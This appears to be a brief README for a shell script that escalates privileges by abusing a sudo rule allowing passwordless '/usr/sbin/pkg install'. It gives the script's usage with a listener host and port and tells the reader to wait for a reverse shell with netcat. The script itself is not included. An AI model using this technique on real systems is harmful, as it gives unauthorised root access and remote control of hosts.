# pkg_privilege_escalation_script
shellscript for pkg_privilege_escalation

sudo -l

->
    
    (ALL) NOPASSWD: /usr/sbin/pkg update
    
    (ALL) NOPASSWD: /usr/sbin/pkg install *

if get situation like a above, when pressed "sudo -l"

then exploitable in this script,,, maybe


usage:
    
    ./pkg_priv_esc.sh <lhost> <lport>
    
 
 Don't forget "chmod +x" before execute 


And open other terminal and listenning netcat for reverse_shell
